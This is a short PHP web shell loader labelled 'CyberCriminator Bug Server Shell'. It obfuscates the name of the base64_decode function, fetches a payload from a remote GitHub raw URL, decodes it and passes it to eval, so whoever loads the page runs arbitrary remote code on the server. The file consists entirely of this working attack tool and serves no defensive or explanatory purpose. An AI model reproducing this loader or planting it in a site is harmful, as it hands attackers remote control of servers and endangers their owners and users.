<html>
<head>
<center>
<font face="tahoma" size="5" color="darkred"> CyberCriminator Bug 🐛 Server Shell<br></font>
</center>
<?php
$otuzbir = 'ba'.'se'. 128/2 .'_' .'de'.'co'.'de';
$otuziki = ("https://github.com/cybercriminator/BaBa/raw/master/BaBa");
$otuzuc = file_get_contents($otuziki);
eval("?>".($otuzbir($otuzuc)));
?>
</head>
</html>